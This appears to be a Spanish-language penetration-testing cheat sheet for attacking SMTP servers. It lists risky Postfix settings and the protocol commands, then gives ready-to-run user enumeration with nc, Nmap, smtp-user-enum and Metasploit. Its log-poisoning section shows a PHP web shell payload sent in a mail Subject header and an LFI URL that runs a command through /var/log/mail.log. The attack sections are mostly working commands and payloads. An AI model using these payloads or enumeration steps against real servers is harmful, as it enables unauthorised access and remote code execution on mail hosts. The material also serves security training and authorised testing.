---
title: SMTP (Simple Mail Transfer Protocol - Puertos 25, 465, 587)
pubDate: '2026-08-26'
---

## ¿Qué es SMTP?
**Simple Mail Transfer Protocol (SMTP)** es el protocolo utilizado para el envío y retransmisión de correos electrónicos. Aunque su función principal es el transporte de mensajes, para un atacante es una fuente crítica de **enumeración de usuarios**, vectores de **Open Relay** y, en combinación con LFI, de **ejecución remota de comandos (RCE)**.

---

## ⚙️ Ficheros de Configuración y Directivas Críticas

### Ruta Clave: `/etc/postfix/main.cf`
| Directiva / Ajuste | Impacto de Seguridad |
| :--- | :--- |
| `mynetworks = 0.0.0.0/0` | **Configuración Peligrosa:** Permite que cualquier host envíe correos electrónicos no autenticados actuando como Open Relay o facilitando el spoofing masivo de remitentes. |
| `smtpd_banner` | Fuga de versión exacta del servidor de correo. |
| `disable_vrfy_command = no` | Permite el uso del comando `VRFY` para verificar usuarios válidos del sistema. |

---

## 📜 Tabla de Comandos del Protocolo SMTP

Para interactuar manualmente con el servicio vía `nc` o `telnet`, es imprescindible dominar estos comandos estándar:

| Comando | Descripción |
| :--- | :--- |
| `HELO <dominio>` / `EHLO` | Inicia sesión con el hostname del cliente y abre la sesión SMTP. |
| `AUTH PLAIN` | Extensión de servicio utilizada para autenticar al cliente con credenciales. |
| `MAIL FROM:<email>` | Especifica la dirección del remitente del correo. |
| `RCPT TO:<email>` | Nombra al destinatario del mensaje (útil para enumeración si `VRFY` está bloqueado). |
| `DATA` | Inicia el bloque de transmisión del cuerpo del correo (se finaliza con una línea que contenga solo un punto `.`). |
| `RSET` | Aborta la transmisión iniciada pero mantiene la conexión activa con el servidor. |
| `VRFY <usuario>` | Comprueba si un usuario o buzón local está disponible en el servidor. |
| `EXPN <lista>` | Expande y consulta miembros de una lista de correo o alias. |
| `NOOP` | Solicita una respuesta `250 OK` para evitar la desconexión por inactividad (*timeout*). |
| `QUIT` | Finaliza y cierra la sesión con el servidor SMTP. |

---

## 🔎 1. Enumeración de Usuarios

### 1. Banner Grabbing y Comandos Manuales (`VRFY` y `RCPT TO`)
```bash
nc -nv <TARGET_IP> 25
220 mail.target.local ESMTP Postfix
HELO test.com
VRFY root       # Código 250: Usuario existente
VRFY admin      # Código 550: Usuario no existe
```

### 2. Scripts NSE de Nmap para SMTP
```bash
nmap -p 25,465,587 --script=smtp-commands,smtp-enum-users,smtp-open-relay,smtp-ntlm-info <TARGET_IP>
```

### 3. Automatización con `smtp-user-enum` y Metasploit
```bash
# smtp-user-enum
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>

# Metasploit
msfconsole -q
msf> use auxiliary/scanner/smtp/smtp_enum
msf> set RHOSTS <TARGET_IP>
msf> set USER_FILE /usr/share/seclists/Usernames/Names/names.txt
msf> run
```

---

## 🚀 2. SMTP Log Poisoning (RCE via LFI)

Ataque que combina una vulnerabilidad **LFI** con la capacidad de inyectar código malicioso en los logs del servidor de correo.

### Flujo del Ataque:
1. **Enviar el correo envenenado:**
   ```bash
   nc -vn <TARGET_IP> 25
   MAIL FROM: test@attacker.com
   RCPT TO: root
   DATA
   Subject: <?php system($_GET['cmd']); ?>
   .
   QUIT
   ```

2. **Ejecución del comando mediante LFI:**
   `http://<TARGET_IP>/index.php?page=/var/log/mail.log&cmd=id`

### Rutas Habituales de Logs y Buzones:
| Ruta | Descripción |
| :--- | :--- |
| `/var/log/mail.log` | Estándar en distribuciones Debian y Ubuntu. |
| `/var/log/maillog` | Estándar en RHEL, CentOS y Rocky Linux. |
| `/var/mail/<usuario>` | Buzón local de usuario (ej. `/var/mail/root` o `/var/mail/www-data`). |
| `/var/spool/mail/<usuario>` | Ruta alternativa de buzones locales. |

---

## 📧 3. Detección de Open Relay

```bash
nmap -p 25 --script smtp-open-relay <TARGET_IP>
```
